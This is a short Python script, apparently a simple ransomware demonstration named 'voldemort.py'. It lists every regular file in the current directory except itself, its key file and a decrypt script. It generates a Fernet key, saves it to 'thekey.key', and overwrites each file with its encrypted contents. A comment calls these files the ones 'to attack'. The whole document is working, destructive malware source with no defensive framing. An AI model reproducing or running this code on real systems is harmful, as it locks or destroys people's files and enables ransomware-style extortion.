#encryption program
import os
from cryptography.fernet import Fernet

#to find all the files in the directory to attack
files = []
for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" : #exclude necessary files from encryption 
		continue
	if os.path.isfile(file): #to make sure folder is not encrypted only files
		files.append(file)


key =  Fernet.generate_key() # generating key
with open("thekey.key","wb") as thekey:
	thekey.write(key)


for file in files: #looping over the files for encryption
	with open(file,"rb") as thefile:
		contents = thefile.read() #reading content

	encrypted_content = Fernet(key).encrypt(contents) #encryption

	with open(file,"wb") as thefile:
		thefile.write(encrypted_content) #writing content
